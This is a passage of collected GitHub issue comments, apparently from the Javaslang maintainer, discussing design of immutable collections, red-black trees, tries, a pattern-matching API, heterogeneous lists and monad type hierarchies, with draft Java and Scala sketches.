https://www.cs.purdue.edu/homes/ayg/CS251/slides/chap13c.pdf\n- http://web.cse.ohio-state.edu/~gurari/course/cis680/cis680Ch11.html\n- http://web.eecs.umich.edu/~sugih/courses/eecs281/f11/lectures/11-Redblack.pdf\n- Enforcing Red Black Tree properties with the type system\nSimple deletion from a BST:\n- http://geeksquiz.com/binary-search-tree-set-2-delete\n. Matt Might's delete algorithm is considered to be simpler to understand than the one of Stefan Kahrs (\"Red-black trees with types\", Journal of functional programming, 11(04), pp 425-432, July 2001).\nA benchmark showed, that Kahrs version is more efficient.\nAndrew Appel\u2019s version of Kahrs should be taken into account, too.\n. I found a Haskell version of Stefan Kahr's algorithm, implemented 2012 by Kazu Yamamoto.\nThe RedBlackTree has the following operations:\nhaskell\n  -- * Creating red-black trees\n  , empty\n  , singleton\n  , insert\n  , fromList\n  -- * Converting to a list\n  , toList\n  -- * Membership\n  , member\n  -- * Deleting\n  , delete\n  , deleteMin\n  , deleteMax\n  -- * Checking\n  , null\n  -- * Set operations\n  , union\n  , intersection\n  , difference\n  -- * Helper functions\n  , join\n  , merge\n  , split\n  , minimum\n  , maximum\n  , valid\n  , showSet\n  , printSet\n. Fixed with #545, #585 and #605.\n. ... or even better, since Traversable is an Iterable:\njava\ndefault Stream<T> toJavaStream() {\n    return StreamSupport.stream(spliterator(), false);\n}\n. Already done.\n. This will move to #218 instead of adding a new method to Option.\n. No, definitely not.\nUse Option.of(optional.orElse(null)) instead, if really needed.\n. Just name it To\u2122\n- To.list(java.util.List)\n- To.option(java.util.Optional)\n- To.f(java.util.function.Function)\n- etc\n. Traversable (implemented by many Javaslang classes, not only collections) has toJavaXxx() methods. These convert Javaslang objects to Java objects.\nThis does not scale well. Instead we could provide a to(Class) or to(Supplier<Collection>) function. S.th. similar was suggested in jOOQ/jOOL#95.\nTraversableOnce has toXxx() methods to convert between Javaslang types.\nJavaslang types have static of(...), ofAll(...) factory methods to convert from the Java std lib world to Javaslang.\nThere shouldn't be a separate To class. The toXxx, toJavaXxx methods should belong to a common interface. Currently TraversableOnce fits best.\n. This is obsolete. We now have Value which is implemented by most of the Javaslang types and Value has many conversion methods.\n. I will close this. We already have conversion methods for Iterables and standard Java collections. That is sufficient.\nIf the will be a great demand in future we can think again about special support for other libs like Guava (if it makes sense). But for not it is 'Schmuck am Nachthemd'.\n. I've solved functionaljava/functionaljava#149 already for Javaslang but it will be interesting to track it anyway...\n. An overview of the next version of Javaslang, especially the collection API (work in progress):\n\n. RedBlackTree and HashArrayMappedTrie are backing data structures for the high-level collections Map/SortedMap, Set/SortedSet etc. I think it does not make sense to implement Traversable.\nIdea\nIn Java and Scala we do not find a good Tree abstraction (as far as I know). The implementations, if any public, are all standalone. But they are very useful IMP. One can argue that Trees are too special from case to case to find a general abstraction. But having nothing is not a good solution when we need some Trees without wanting to wrap our heads around implementing such. Here I want to share some thoughts on how to provide an appropriate abstraction for such data structures in Javaslang.\nThere are two types of trees in Javaslang: backing trees and general purpose trees:\n- backing trees are needed by high-level data structures like Map, Set, etc.\n- general purpose trees are high-level API like Map, Set, etc.\n1) The interfaces should be kept slim. We may add functionality to special interfaces like RedBlackTree in form of static methods. This functionality is called by high-level collections to implement the Traversable interface. I've seen this in Scala's TreeSet which is used in conjunction with a RedBlackTree companion object.\n2) Parent references will not be held.\n3) To be discussed: I'm not sure if we will define general Tree methods which do not align very well with the nature of specific implementations. E.g. getChildren() makes not much sense for binary trees. Here we have a left and a right child. If we want a special Tree, like a BinaryTree, behave like a general Tree, maybe we should implement some sort of Views here. On the other hand - if we make our backing data structures public API, a full fledged general Tree interface would be nice.\n4) Internal immutable state (read: final (non-transient?) instance variables) of implementing classes of backing data structures are made public. This enables users to build functionality on-top without the need for Javaslang to add methods to the corresponding interfaces.\nInterfaces\nWe may introduce a general Tree interface containing values of type T:\n``` java\ninterface Tree {\nboolean contains(T value);\n\n// not sure about this, because of leaf trees with values only at leaves\n// T getValue();\n\nTree<T> add(T value);\nTree<T> remove(T value);\n\nboolean isEmpty();\nint size();\n\n// ...\n\n}\n```\nRoseTree is the most general implementation of Tree.\nAlso we will need a top level interface Trie:\n``` java\ninterface Trie {\nboolean containsKey(K key);\nboolean containsValue(V value);\n\nOption<V> get(K key);\nTrie<K, V> put(K key, V value);\nTrie<K, V> remove(K key);\n\nboolean isEmpty();\nint size();\n\n// ...\n\n}\n```\nBoth, Tree and Trie, do not inherit from each other and have no common base interface.\nRedBlackTree will implement an interface BinarySearchTree:\n``` java\ninterface BinarySearchTree extends Tree {\n@Override\nBinarySearchTree<T> add(T value);\n\n@Override\nBinarySearchTree<T> delete(T value);\n\n}\n```\nAnd then:\n``` java\ninterface RedBlackTree extends BinarySearchTree {\n@Override\nRedBlackTree <T> add(T value);\n\n@Override\nRedBlackTree <T> delete(T value);\n\nstatic <T, U extends Comparable<U>> RedBlackTree<U> map(RedBlackTree<? extends T> tree,\n        Function<? super T, ? extends U> mapper) {\n    // ...\n}\n\nstatic <T, U> RedBlackTree<U> map(RedBlackTree<? extends T> tree,\n        Comparator<? super U> comparator,\n        Function<? super T, ? extends U> mapper)  {\n    // ...\n}\n\n// ...\n\n}\n```\nand\n``` java\ninterface HashArrayMappedTrie extends Trie {\n@Override\nHashArrayMappedTrie<K, V> put(K key, V value);\n\n@Override\nHashArrayMappedTrie<K, V> remove(K key);\n\n// static methods...\n\n}\n```\nHaving static methods ensures, that the backing data structures only implement what is needed by the high level data structures, like Map et. al.\nRoseTree is a general purpose Tree, i.e. it is not backing data structure and may implement more high-level functionality than Trie and BinarySearchTree. I think that it makes no sense to implement Traversable. Here should methods like toList or toStream be used instead.\n``` java\ninterface RoseTree extends TraversableOnce, FilterMonadic<...>, ... {\nList<RoseTree<T>> getChildren();\n\n// ...\n\n}\n```\n. Yes, makes sense. I also think it belongs to the Map interface.\n. I thought much about the Tree collections today and came to the following insight:\nJavaslang's goal is to keep things as simple as possible - when in doubt, leave it away.\nTherefore HAMT and RedBlackTree will not part of the standard collection type hierarchy. Instead they form an architectural layer below our high-level collections (HashMap et. al.) as backing collections. However, they will definitely be public API because they have a high degree of reuse.\nGiven this, there is not need for the interfaces Trie and BinarySearchTree (for now). If they are needed in future, we will add them.\nUnder this condition, I will merge Tree and RoseTree and name it just Tree. Simple.\n. Partial overview:\n- HashMap<K, V> is backed by a HashArrayMappedTrie<K, V> \u2713\n- HashSet<T> is backed by a HashArrayMappedTrie<T, T> \u2713\n- TreeSet<T> is backed by a RedBlackTree<T> \u2713\n- TreeMap<K, V> is backed by a RedBlackTree<Entry<K, V>> with key comparator\n. \n. All of the stories of this epic are implemented.\n. Yes, we can do this. It would make an assumption regarding the runtime type of the List / Traversable. Like treeMap() and flatten().\nSuch methods are annotated with @unsafe to make clear that ClassCastExceptions can occure.\nThe empty List cannot be reduced, but this is clear. Therefore the zero element will never be used explicitely.\nLet's do it!\n. I think I was a little bit too fast with my answer - of course a type can be a Monoid regarding multiple operations. E.g. a currency can be multiplied (zero: 1) and added (zero: 0). It is not clear which monoid to take here.\nI have an uneasy feeling with the whole @unsafe stuff (flatten() and treeMap()). We want to ship the best solution possible for creating robust programs. Being unsafe is contradictory.\nWould you mind if I remove the unsafe methods in a future release? Do you use one of them? I regret the design decision to trade power with safety.\nIn the case of a List<Monoid<T>> we could provide s.th. similar to\n``` java\n Monoid reduce(Function<? super T, ? extends Monoid> f)\n// example:\nList.of(eur(10.0), eur(20.0)).reduce(Currency.product()); // = eur(200.0)\nList.of(usd(10.0), usd(20.0)).reduce(Currency.sum()); // = usd(30.0)\n``\n. Great! :+1: \n. After thinking again, I also tend to useotherwise(). There is nothing toget()from aMatchbefore applying it to anObject.\n. Wow, this would be exactly the solution in order to make thewhen-part ofMatchimplement [Univalent](https://github.com/javaslang/javaslang/blob/master/src/main/java/javaslang/control/Valences.java) (difference: we calltoOption()instead ofget()` then). Awesome!\nThe existing Match syntax allows us to match arbitrary objects (like Scala). Additionally it makes Match reusable (see example below) and also composable, because it is a Function.\nDo you think that Match will be too complicated, if there are two ways to use it: (1) as value, (2) as function ? Simplicity is very important. Ideally there is only one way to achieve a goal. In case (1) I would use orElse(), in case (2) I would use otherwise() for the default case.\n``` java\nclass Test {\nstatic final Match<BigDecimal> TO_BIG_DECIMAL = Match\n    .when((Integer i) -> new BigDecimal(i))\n    .when((BigDecimal bd) -> bd)\n    .otherwise(BigDecimal.ZERO);\n\nList<BigDecimal> mapToBigDecimal(List<Number> numbers) {\n    return numbers.map(TO_BIG_DECIMAL);\n}\n\n}\n``\n. Also I think of changing the method nameofType()toas(). It overrides type inference for the return type of theMatchif the return type of the firstwhen()` is not sufficient.\nExample:\nThis does/will not compile:\n``` java\nMatch   .when((int i) -> 1)\n        .when((double d) -> 1.0)\n        .otherwise(-1)\n        .apply(1);\nMatch.of(1)\n        .when((int i) -> 1)\n        .when((double d) -> 1.0)\n        .orElse(-1);\n```\nThis does/will compile:\n``` java\nMatch.as(Number.class)\n        .when((int i) -> 1)\n        .when((double d) -> 1.0)\n        .otherwise(-1)\n        .apply(1);\nMatch.of(1).as(Number.class)\n        .when((int i) -> 1)\n        .when((double d) -> 1.0)\n        .orElse(-1);\n```\n. @jbgi I've prototyped your suggestion and the API feels really great! Here is the code (currently only within my fork): Match2 - And, oh my, this is most probably also a Monad :-)\nCompared to the current Match solution there are the following changes:\n- functions with primitive argument cannot be passed anymore to when()\n- Match is no Function any more, i.e. it needs to be instantiated when applying a value: list.map(x -> Match.of(x).when(...).get())\nThe first point is not relevant in my opinion. The second point has an impact on performance, because the current reflection magic used to get the runtime type of the function argument is relatively slow. I use a trick here and deserialize lambdas to get the MethodType. When a match is executed a hundred thousand times a second, there will be a significant difference between the current and the new solution.\nI'm unsure if we should keep the current solution. I want to keep things simple and give only one option to use a Match...\n. @jbgi We could do it as everyone else and just give a type hint to circumvent the reflection magic: Match.of(i).when(Integer.class, i -> 1)\n. I played around with the new API. We see type erasure when using generic types:\njava\nMatch.of(List.of(1, 2, 3))\n        .when(List.Nil.class, nil -> 0)\n        .when(List.Cons.class, cons -> ((List<Integer>) cons).head()) // cast is unsafe here!\n        .get();\nThe previous approach was unsafe by design:\njava\nMatch   .when((Some<Integer> some) -> 1) // no cast needed, but also unsafe!\n        .when((Some<String> some) -> Integer.parseInt(some.get()))\n        .apply(new Some<>(\"123\")); // result is 1 (!)\n. Interesting: Intellij Idea compiles this, but Java 1.8.0_45 does not:\njava\nMatch.of(List.of(1, 2, 3)).as(Number.class)\n        .when(List.Nil.class, nil -> 1.0)\n        .when(List.Cons.class, cons -> (Integer) cons.head())\n        .get();\nErrors:\n[ERROR] /Users/daniel/git/javaslang/src/test/java/javaslang/control/Match2Test.java:[35,62] cannot find symbol\n  symbol:   method head()\n  location: variable cons of type java.lang.Object\n[ERROR] /Users/daniel/git/javaslang/src/test/java/javaslang/control/Match2Test.java:[36,21] incompatible types: java.lang.Object cannot be converted to java.lang.Number\n. I've thought about loosing generic types. The API Match.of(value).when(Class, Function) is not helpful. I will provide Match.of(value).when(Function) instead (this was the initial version using reflection magic).\nAs mentioned already it is slower but keeping the current API Match.when(Function), it can be used in performance critical cases. The when(Function) notation is then also consistent for both types of Match builders (value and function).\n. Also required: Instead of\njava\nfinal A result = Try.of(this::bunchOfWork)\n    .recover(x -> Match\n        .caze((Exception_1 e) -> ...)\n        .caze((Exception_2 e) -> ...)\n        .caze((Exception_n e) -> ...)\n        .apply(x))\n    .orElse(other);\nwe want to write\njava\nfinal A result = Try.of(this::bunchOfWork)\n    .recover(Match\n        .caze((Exception_1 e) -> ...)\n        .caze((Exception_2 e) -> ...)\n        .caze((Exception_n e) -> ...))\n    .orElse(other);\nI.e. a Match.Case is a Function<T, R>, where T is defined implicitly by the context.\n. @martin-g thanks, I will dive into it :+1:\n. I've also experimented with 'emulating' pattern matching like motif does. This is not practicable for Java developers. I already removed ValueObject from Javaslang, which should have been the base for unapplying objects as basis for pattern matching. This is more a playground to see what is possible than being practicable in real world apps. It is better to not try this with Java. Javaslang's current pattern matching by type is useful and sufficient.\nThanks for the link! It was insightful.\n. Follow-up: #317 \n. Thank you! Do you mean the feature of non-blocking streaming of data-chunks, which may be pulled from a source or may be also pushed from a source?\nThere has been some initial discussion in #79. At #186 I am tracking activities now.\n. Without knowing how the classes are implemented this looks like some sophisticated implementation of the observer pattern with the addition of thread synchronization.\nWhat I want is some few, strongly typed, composable building blocks. I haven't yet investigated what types of async abstractions are necessary to cover this whole topic with the minimum amount of types.\nAs said, without having deep-dived into that topic, the following dualities come to my mind:\n- linear vs parallel (the latter splits into concurrent vs. distributed)\n- push vs. pull\n- blocking (sync) vs. non-blocking (async)\n- ...\nA good starting point is the reactive-streams project. Resources:\n- Reactive Streams & Akka Http\nAlso non-functional aspects have to be covered, like\n- automatic resource management (e.g. Autoclosables)\n- automatic exception handling of composed things\n- life-cycle management (when does information-flow end?)\n- how to lift informations to processable entities (Chunks)\n- ...\n. out of scope for Javaslang\n. Great idea! Have to think about providing aliases. Most collections are interfaces with static factory methods to get concrete instances. Static interface methods are not inherited.\nI agree, FQN are arguable. Javaslang collections play well together with the Iterable interface, this can also be used instead of the specific class names.\nHere is a (currently broken) example of bundling aliases per package. Here an experimental alias interface is used, starting with a lower case. This could be seen as a kind of module which is both, a class and a package.\n``` java\npackage javaslang.collection;\ninterface alias {\n    interface _List extends List {\n        // duplicate all static List methods here\n        static  _List of(T... elements) {\n            // BROKEN: Need a _List instead of a List\n            return List.of(elements);\n        }\n    }\n    interface _Stream extends Stream {\n        // duplicate all static Stream methods here\n    }\n}\n```\nUsage:\n```\nimport javaslang.collection.alias.*;\n// ...\n_List.of(1, 2, 3);\n``\n. ...thinking of an alias generator which follows the scheme mentioned above. Alias modules containg_Originalinterfaces can be theoretically generated automatically using reflection with overridden methods_Original method(args)where necessary (modulo generics?).Proxy` will do the rest?\n. Hey! Of course you're right - we search the simplest solution possible, there will be no aliases using reflection voodoo magic proxy mechanisms lingering around in Javaslang :-)\nThe control package is fixed, so are the collections. The only experimental feature is the match API. With #227 it will be also fixed in the next release, too. I should have been started with a 0.x version but now we are at 1.x and can't move back. I think this is ok. The monadic types and collections are already battle-hardened. I do not expect much API movement.\nBack to your question, I'm still not convinced prefixing the collections. Mostly because the Java collections are outdated IMO. New code should not rely on them any more. Javaslang's collections are replacements and not considered as alternatives. I'm aware of the fact that java util collections will be among us for many years, maybe the rest of our lives, but my vision is to go to the next level. I think this is the Slang part of Javaslang :-)\n. Yes, I know what you are talking about :-) At $work we have a legacy Java system with gigabytes of transitive dependencies. Our vendor started development in the 90s. A big amount of classes is still not typed with generics - it's a nightmare. \nHere is a List of possibilities to name things:\n``` java\n// import javaslang.collection.List;\nList compute(List input) {\n    // this is the preferred way - use Javaslang collections!\n    return List.of(input).filter(...).map(...);\n}\n// import javaslang.collection.List;\njava.util.List compute(java.util.List input) {\n    // this is the preferred way to interoperate with Java\n    return List.of(input).filter(...).map(...).toJavaList();\n}\n// import java.util.List;\nList compute(List input) {\n    // too long package name\n    return javaslang.collection.List.of(input).filter(...).map(...).toJavaList();\n}\n// import java.util.List;\n// import javaslang.collection._List;\nList compute(List input) {\n    // ugly prefix\n    return _List.of(input).filter(...).map(...).toJavaList();\n}\n// import java.util.List;\n// import javaslang.collection.SList;\nList compute(List input) {\n    // Aaahhhrg! HList would be a SHList\n    return SList.of(input).filter(...).map(...).toJavaList();\n}\n```\n_ is currently the only prefix that does not make me jump out of the window but it is ugly though. I will stick with List.\n. So...\nclasses in javaslang.collection are not intended to be used as java.util.stream.Stream++.\nIt is highly recommended to design programs or new parts of programs from the ground up to use immutable data structures. It is recommended to fully qualify java util collections, if used with javaslang collections side-by-side.\nWhen things should change we need to change s.th. otherwise nothing will change.\n. Thx!\n. Thx Sebastian, that helps!\n. Thx @martin-g, perspectively we should also add HList!\n. Xtend uses 6, .Net/C# has 8, we stick with 8 for now (see #246)\n. Scala's HList has type inference:\n``` scala\ndef flattenT <: Product, L <: HList\n  (implicit hl : HListerAux[T, L], flatten : Flatten[L]) : flatten.Out =\n    flatten(hl(t))\nval t1 = (1, ((2, 3), 4))\nval f1 = flatten(t1)     // Inferred type is Int :: Int :: Int :: Int :: HNil\nval l1 = f1.toList       // Inferred type is List[Int]\nval t2 = (23, ((true, 2.0, \"foo\"), \"bar\"), (13, false))\nval f2 = flatten(t2)\nval t2b = f2.tupled\n// Inferred type of t2b is (Int, Boolean, Double, String, String, Int, Boolean)\n```\nIt is said to be nothing more than a stack of Tuple2:\n``` scala\ndef hconsA,B = (a,b)\ndef hnil = Unit\nhcons(\"foo\", hcons(3, hnil)) : (String, (Int, Unit))\n```\nQuestion: How would a sketch of a simple HList implementation look like based on Java/Javaslang?\n- sketch an interface HList with implementations HList.Cons and HList.Nil\n- methods of our spike are head(), tail() and isEmpty()\n- what is the type of HList.of(1, \"a\", true)?\n. Let's start with this:\n``` java\npackage javaslang.collection;\npublic interface HList> {\nstatic HList nil() {\n    return HNil.INSTANCE;\n}\n\nstatic <H, T extends HList<T>> HList<HCons<H, T>> cons(H head, T tail) {\n    return new HCons<H, T>(head, tail);\n}\n\nstatic <H> HCons<H, HNil> of(H element) {\n    return of(element, nil());\n}\n\nboolean isEmpty();\n\n<E> HCons<E, L> prepend(E element);\n\n// I think head and tail cannot be part of this interface but need to be moved to HCons\n\n? head();\n\n? tail();\n\nfinal class HNil extends HList<HNil> {\n\n    private static final HNil INSTANCE = new HNil();\n\n    private HNil() {\n    }\n\n    @Override\n    public boolean isEmpty() {\n        return true;\n    }\n\n    @Override\n    public <E> HCons<E, HNil> prepend(E element) {\n        return HList.cons(element, this);\n    }\n    ...\n}\n\nfinal class HCons<H, T extends HList<T>> extends HList<HCons<H, T>> {\n\n    private final H head;\n    private final T taill;\n\n    private HCons(H head, T tail) {\n        this.head = head;\n        this.tail = tail;\n    }\n\n    @Override\n    public boolean isEmpty() {\n        return false;\n    }\n\n    @Override\n    <E> HCons<E, HCons<H, L>> prepend(E element) {\n        return HList.cons(element, this);\n    }\n    ...\n}\n\n}\n```\n. First thoughts:\nLooking at this example impl, I think HLists cannot be constructed by varargs factory methods like HList.of(1, \"a\", true, 1.0d) without loosing type information. HList needs to be constructed element-by-element.\nWhen building them it is practicable to append elements. When reading them it is practicable to read from oldest (left) to newest (right). Currently we have prepend, i.e. element are read in the different order. Do we really need to reverse them for reading them in the right order or can we write a more smart HList?\n. This reading: https://apocalisp.wordpress.com/2008/10/23/heterogeneous-lists-and-the-limits-of-the-java-type-system/\n. The Validation Builders could still use Tuples until Tuple8 and then switch automatically to HList.\nIn practice, for reasons of readability, the variable types could be moved off-screen ;-p\n. This is a purely theoretical construct and can currently not implemented in Java in a practical way.\nSnippet from the apocalisp blog (see link above):\njava\n    // A lot of type annotation\n    final HAppend<HNil, HCons<Double, HCons<String, HCons<Integer[], HNil>>>,\n      HCons<Double, HCons<String, HCons<Integer[], HNil>>>> zero = append();\n    final HAppend<HCons<Boolean, HNil>, HCons<Double, HCons<String, HCons<Integer[], HNil>>>,\n      HCons<Boolean, HCons<Double, HCons<String, HCons<Integer[], HNil>>>>> one = append(zero);\n    final HAppend<HCons<Integer, HCons<Boolean, HNil>>, HCons<Double, HCons<String, HCons<Integer[], HNil>>>,\n      HCons<Integer, HCons<Boolean, HCons<Double, HCons<String, HCons<Integer[], HNil>>>>>> two = append(one);\n    final HAppend<HCons<String, HCons<Integer, HCons<Boolean, HNil>>>,\n      HCons<Double, HCons<String, HCons<Integer[], HNil>>>,\n      HCons<String, HCons<Integer, HCons<Boolean, HCons<Double, HCons<String, HCons<Integer[], HNil>>>>>>>\n      three = append(two);\n. A few weeks ago Roland Kuhn was here in Kiel and demonstrated the new Akka features at a Nordic Coding event - very impressive. I will take this into account for the 1.3.0 release, where this topic will be covered!\n. Fan-in/fan-out is very similar to joining results in a parallel computation, as explained here.\nIn Javaslang 2.0.0 we do this already for example with Future, which represents asynchronous computations handled by callbacks.\n``` java\nfinal Promise promise = Promise.make();\nfinal Future task1 = Future.of(this::computation_1);\ntask1.onComplete(result1 -> {\n// fan-out\nfinal Future<U> task2 = Future.of(this::computation_2);\nfinal Future<V> task3 = Future.of(this::computation_3);\n\n// fan-in\ntask2.zip(task3).onComplete(result23 -> promise.complete(...));\n\n});\nfinal Future task4 = promise.future();\n```\nTo declare such flow akka-stream defines syntactic sugar ~>. Maybe we can do s.th. similar in Javaslang. The example above could look like this:\njava\ntask1.pipe(task2::apply, task3::apply).pipe(task4::apply);\nHere it is just the flow we sketch, callbacks is another story. The general idea is to circumvent the so-called 'callback-hell' (we know from Javascript for example) by using Promise to escape the callback.\n. out of scope for Javaslang\n. This is great!\nWe should take this into account when designing the collections. List and Stream are there, Map (#170) and Set (#214) are in the pipeline. I'm currently investigating which form of binary search tree to take in order to create efficient Map and Set implementations. Not only time complexity is important but also space complexity, particularly for HashMaps. There are important balanced tree impls, AVL and RedBlack. Scala uses binary encoded Tries in order to fail fast if a key/hash is not present. I'm into it - a very exiting topic!\n. @sirinath Could you please provide some details, what to implement?\nI think if it is a Java equivalent of Scala case classes, like adt4j project does, @jbgi mentioned above, it is out of scope for Javaslang. There already exists a great project that exactly does that!\n. I'm against baking this annotation trickery into Javaslang. With JEP 169 there is already an official project to add Value Objects to Java. Beside that I don't like annotations very well.\n. @talios I think the Monad operations on one ADT can be expressed in multiple ways. It is likewise with Monoids (String concatenation, String multiplication, etc). It is better to express this explicitly.\n. @talios Yes, right...\n. Nice!\n. Can't this be declared as some sort of mapping file within derive4J? From the API perspective this does not scale very well. I mean, why isn't it possible to declare within derive4J which class is Option and how to create a None and a Some?\n. Great, this sound like the right direction!\n(If I understand it right, you provide views for ADTs like Option. Because you provide a general abstraction over a set of specific implementations, you cannot rely on a specific inheritance hierarchy, e.g. good old Java has just Optional, Javaslang has Option, Some and None. For FP features, like pattern matching, types are more useful compared to a flat view, but we can't achieve this when providing a general abstraction backed by various different impls, right?)\n. Too many ADT projects in Java land. We will wait for official Java support by oracle...\n. In Javaslang Tranversable is a representation of recursive 'foldable' data types, and it has map(), flatMap()etc. Of cause that does not make Traversable a Functor or a Monad. Actually all implementing classes (List and Stream) are Monads, so it was a matter of object oriented refactoring to generalize the similarities and group them in a super class/interface. This is all about it - no special reason.\nBut we can do it the right way - what would you suggest? Instead of Apply I like the full name Applicative. I do not like most of the naming in functionaljava. Perhaps because I'm more a 'Scala' than a 'Haskell'...\nMake a suggestion! Pull requests are welcome! :-)\n. Ahh, sorry, I forgot to answer your question about code generation. Please try to generate duplicate code (minimum granularity: classes), otherwise it would be only a matter of time that code / javadoc diverges. I would like to assist you, if you need help!\n. I prototype code always outside of a generator (just as usual), copy it (or parts of it) into generator/Generator.scala and create generator templates.\nYou may commit code as-is. I will do the generator-stuff if necessary. If you need to change Functor/CheckedFunctor and Monad/CheckMonad you may copy them from src-gen to src and comment out these lines in Generator.scala:\nscala\ngenMatch()\ngenFunctions()\n// genFunctor()\n// genMonad()\ngenPropertyChecks()\ngenTuples()\n. @jbgi /cc @mperry @lukaseder\nThe algebraic types in Javaslang are mainly used as an API design aspect to encapsulate common methods and mark/declare specific properties of classes. We have {Functor + Monad}, extended by many types in Javaslang, and Monoid, used only in a fold-Method of Traversables.\nI've got recent feedback from users that they are 'in fear' of the algebra package.\nPlease tell me more about the things you want to implement and how they integrate with the existing classes - or should they be used on their own?\nMy main goal for Javaslang is to create a Java extension which takes the most out of the new Java features and to bring immutability as default to Java. I target the majority of Java developers out there and I'm sure that many are even not familiar in depth with variance types regarding generics. I think that sophisticated algebraic stuff would keep users away.\nI'm really excited that you bring more functional mojo to Javaslang. And I'm sure it is useful. Maybe a module javaslang-algebra would make sense for the users, who want to go really deep down the rabbit hole?\n. More specific I see Javaslang as a simple Scala. The algebraic extension is more like Scalaz.\n. A good name for the module would be javaslang-pure! :-)\n. @lukaseder You misunderstood, of cause Java classes with generic type parameters are invariant. However, Arrays are covariant, overriding methods are covariant in the return type, and - what I meant, upper and lower bounds on generic type parameters can also be used in this context. Many Java 'experts' are not aware of these or use them not correctly.\nLet's not go to deep in a technical discussion here. Let's think about how we can bring funky algebra trickery to the javaslang-pure module! :-)\n. @lukaseder \n\nI've seen your trick involving recursive generics in Kind. If this is unleashed upon your users, they'll run :-)\n\nI hope they will stay with me.\nMaybe I invent a new paradigm 'Kind Oriented Programming' KOP\u2122\nOf course there will be also a 'Kindly Manifesto'.\nICanHazKind :-)\n. Yes, it has to evolve a little bit. Monad will not extend Iterable, that was no good idea. The javaslang.algebra classes should move to javaslang-pure (instead of renaming the package internal). My idea is, to make javaslang-pure the core/foundation of javaslang. The javaslang module should be kept as stable as possible. The foundation may evolve over time.\nI want to take part in the design of the core, e.g. with code reviews, talk about conventions like naming, packages, etc.\nWe will get this to the next Javaslang level! This will be awesome!\n. @lukaseder I'm relatively satisfied with the current API. The generics of Traversable and Seq are distracting so far.\n. Sounds interesting, to investigate it, we need a technical spike/prototype in a branch.\n. The javaslang-pure package will probably contain only interfaces of algebraic types (not data types) + unit tests.\n. I have to see examples based on Javaslang/how to do it better and see how the API 'feels' from the call site.\nBecause I'm really deeply convinced that the current API makes so much sense.\nI'm thankful about every gist showcase here...\n. @jbgi @lukaseder what are the main pain points of the new tree api #256 in your opinion.\nIt is simplified there. The Kind arguments Tree<M, T> will be also there. How would you remove the <M>?\nWhat happens to the flatMap methods (which need the Kind)?\nHow could views and conversion methods help here?\nAre there other issues using interfaces here in your opinion (beside security aspects)?\nYour answers would help a lot to get this in the right direction!!\n. @lukaseder Thank you, Lukas! Also for the links you provided - very insightful, this takes me to the ground. Wherefrom do you take the time to manage all this? :-)\nThe recursive type parameter will not leak into the next release. These flatMap() and flatten() functions really tip me over the edge. Need a beer.\n. Everyone should have a Lukas :-)\nLate night coffee is also hard to handle...\n. @jbgi The semigroupoids package of Edward Kmett would be a great reference for javaslang-pure - I think highj uses it also...\n. @lukaseder @jbgi \nI've thought about all possibilities to...\n- remove recursive generic parameters\n- have a consistent (monadic) type hierarchy\n- get flatMap() right, e.g. List(Some(1), None).flatMap(e -> e) = List(1)\nThe result is, that I had to remove the whole algebra package, which was not in the right place within this project.\nThe only loss is, that we now have no common interface for monads (beside other minor changes).\n@jbgi Now we have to think about how to integrate javaslang-pure - or may it exist on its own?\nLukas, thanks for pushing me!\n. @jbgi \nWe could do that only in a flat way:\njava\ninterface List<T> extends Seq<T>, Kind<List<?>, T> {}\ninterface Stream<T> extends Seq<T>, Kind<Stream<?>, T> {}\ninterface Option<T> extends Kind<Option<?>, T> {}\ninterface Try<T> extends Kind<Try<?>, T> {}\ninterface Either.LeftProjection<L, R> extends Kind<LeftProjection<?, R>, L> {}\ninterface Either.RightProjection<L, R> extends Kind<RightProjection<L, ?>, R> {}\ninterface Match<T> extends Kind<Match<?>, T> {}\ninterface Gen<T> extends Kind<Gen<?>, T> {}\ninterface Arbitrary<T> extends Kind<Arbitrary <?>, T> {}\nNo inheritance possible then with a new kind of Kind, e.g. this will then not work:\njava\ninterface ArrayList<T> extends List<T>, Kind<ArrayList<?>, T> {}\n. Also all trees are then of one Kind. Maybe this is a solution until a future Java version...\n. @jbgi Possibly a proxy-mechanism is possible which also augments children (linked list tails and tree childrenfor example):\njava\n  Traversable\n       |\n     Tree<T> <-------- TreeKind<T> extends Tree<T>, Kind<Tree<?>, T>\n (Nil, Branch)=final\n       |\n BinaryTree<T> <------ BinaryTreeKind<T> extends BinaryTree<T>, Kind<BinaryTree<?>, T>\n (Nil, Branch)=final\n       |\nRedBlackTree<T> <----- RedBlackTreeKind<T> extends RedBlackTree<T>, Kind<RedBlackTree<?>, T>\n (Nil, Branch)=final\nBut looking at this, it seems to blow up all too much and it is adding too much trickery\n. @lukaseder I'm thankful, this was the right solution.\nThere where several caveats with that. Monadic operations have to be relaxed to be practicable. Scala does this also in Traversable. From the end-user API perspective there is nothing missing. From the API design perspective the algebraic interfaces passed away. They where used technically only somehow.\nIn my local fork Kind exists and I currently experiment how to add value for users of Javaslang, without mystifying the API.\nThe upcoming project javaslang-pure will cover pure functional programming. The classes are not lost, they will come back :-)\n. Wow, I closed this issue?! It was an accident :)\n@lukaseder I liked the common Monad class.\n\n:'( ... ;)\n\nI will defilibrate it today and see what is possible with Kind. It will stay with us until there is a better solution coming from the pure module.\n:)\n. The patient did not survive. I have tried everything but Monad and Kind cannot be integrated. Locally I fiddled around hours with intersection types, changed the collection hierarchy, ... It simply does not work with Java or I don't see it.\nI've to go further at this point.\nThe monadic types Option, Try, ..., List, ... have now a common type TraversableOnce which extends Iterable.\n. @jbgi I had the idea to keep the javaslang-pure module very thin but 'deep'.\nCool would be a layer or some functionality, which lifts arbitrary? types or at least javaslang types to algebraic types. Some kind of augmentation or decorator pattern. With this we can lift types into the pure core and operate algebraic on them...\nI don't have a concrete solution, just a thought...\nI'm on a short trip this weekend and mostly offline...\nHave a great weekend!\n- Daniel\n. Hehe :-) :+1: \n. Then we will wait until Lukas is open sourced or available under a dual license.\n. I will track functionaljava/functionaljava#126 to see how we can accomplish this in this context.\n. Original topic:\n\nAdd Apply between Monad and Functor\n\nThis is a duplicate now. With #803 we add Applicative (which is fused with Apply as known from Scalaz).\n. Btw - the examples above are using #242 already.\n. The above code sketches the general solution of moving runtime type information to the static flatten() method, which are passed to the instance method transform().\nFor a correct implementation of flatten() we need to differentiate it by enclosing type. It is not sufficient to call monad.flatMap(Function.identity()).\n1) For univalent/one-valued type (see Valences.Univalent), like Option and Try, we want to allow something like\njava\nOption<Try<String>> option = ...;\nOption<String> result = option.transform(Option.flatten());\nWe can achieve this like so:\njava\nstatic <T> Option<T> flatten(Option<? extends Monad<?, T> & Univalent<T>> option) {\n    ...\n}\nThen, because Java has no 